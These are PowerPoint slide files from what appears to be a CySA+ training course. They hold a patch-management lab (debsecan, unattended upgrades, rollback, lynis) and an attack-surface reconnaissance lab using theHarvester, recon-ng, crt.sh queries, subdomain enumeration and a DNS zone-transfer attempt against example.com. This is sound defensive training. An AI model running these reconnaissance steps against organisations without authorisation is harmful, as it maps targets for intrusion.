                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Validate the patch (CySA+ "Validation")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>If a critical service is broken, you trigger the rollback plan.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ debsecan --suite=$(lsb_release -cs) --only-fixed | wc -l   # should drop</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 7: Rollback plan (CySA+ "Rollback")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A real rollback strategy:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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240" y="3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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3" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 8: Attack surface reduction (CySA+ 2.5)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A patch closes a single vuln.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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452360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt list --installed 2&gt;/dev/null | wc -l</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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005840" y="468447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05840" y="4684470"/>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30" name="TextBox 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 9: Re-score with lynis (CySA+ "Compensating control")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Compare against the score from Lab 2.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Rectangle 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ lynis audit system --quick --quiet | tail -20</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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777240" y="5433364"/>
            <a:ext cx="91440" cy="78455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1005840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="9509760" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 10: Maintenance window playbook</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A template you can drop into Lab 25:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 3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39" name="TextBox 3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0" name="TextBox 3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620</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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18 — What You Learned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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By completing this lab you can:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  List unpatched CVEs with debsecan and prioritise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Enable Ubuntu unattended security upgrades.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Run the Test → Implement → Validate → Rollback sequence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reduce attack surface by removing unused packages and services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use lynis to demonstrate a measurable hardening improvement.</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621</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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19 — Attack Surface Reconnaissance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1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Objective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In this lab you will enumerate the external attack surface of a target organisation using theHarvester and recon-ng, plus free web services like crt.sh, DNSDumpster, and Shodan. This maps to CySA+ 2.5 (Attack surface management — Edge discovery, Passive discovery, Penetration testing, Bug bounty) and 2.2 (Multipurpose…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Environment: Killercoda Ubuntu Playground</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622</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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19 — Hands-On Steps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78455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78455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05840" y="194675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1946757"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 1: Install tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1901037"/>
            <a:ext cx="3977639" cy="5486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52360" y="1901037"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ apt update &amp;&amp; apt install -y theharvester recon-ng curl whois dnsutils j</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2695651"/>
            <a:ext cx="10634472" cy="78455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2695651"/>
            <a:ext cx="91440" cy="78455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005840" y="285932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2859328"/>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8" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="2695651"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 2: Passive discovery with theHarvester</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>-b selects sources.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2813608"/>
            <a:ext cx="3977639" cy="5486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52360" y="2813608"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ theHarvester -d example.com -b duckduckgo,crtsh,bing -l 100</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3608222"/>
            <a:ext cx="10634472" cy="78455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3608222"/>
            <a:ext cx="91440" cy="78455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005840" y="3771899"/>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05840" y="3771899"/>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5" name="TextBox 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="3608222"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 3: Certificate-transparency search (edge discovery)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Certificate Transparency logs are the single best free subdomain discovery source — every TLS cert ever issued is public.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="3726179"/>
            <a:ext cx="3977639" cy="5486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52360" y="3726179"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ curl -s 'https://crt.sh/?q=%25.example.com&amp;output=json' | jq -r '.[].nam</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4520793"/>
            <a:ext cx="10634472" cy="78455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77240" y="4520793"/>
            <a:ext cx="91440" cy="78455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1005840" y="468447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05840" y="4684470"/>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32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="4520793"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 4: Recon-ng modular framework</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Inside the recon-ng shell:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="4638750"/>
            <a:ext cx="3977639" cy="5486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452360" y="4638750"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ recon-ng</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5433364"/>
            <a:ext cx="10634472" cy="78455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77240" y="5433364"/>
            <a:ext cx="91440" cy="78455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05840" y="5597041"/>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05840" y="5597041"/>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5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="5433364"/>
            <a:ext cx="5486400" cy="784555"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 5: DNS enumeration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The second command attempts a zone transfer.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Rectangle 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5551321"/>
            <a:ext cx="3977639" cy="5486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452360" y="5551321"/>
            <a:ext cx="3703319" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1000" b="0">
                <a:solidFill>
                  <a:srgbClr val="9CDCFE"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>$ for sub in www mail vpn admin api dev staging test mx ftp; do</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623</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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19 — Hands-On Steps (cont'd)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39293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39293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05840" y="22509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2250948"/>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1" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1783080"/>
            <a:ext cx="9509760" cy="1392936"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Step 6: Shodan-style passive port discovery (browser)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="200"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
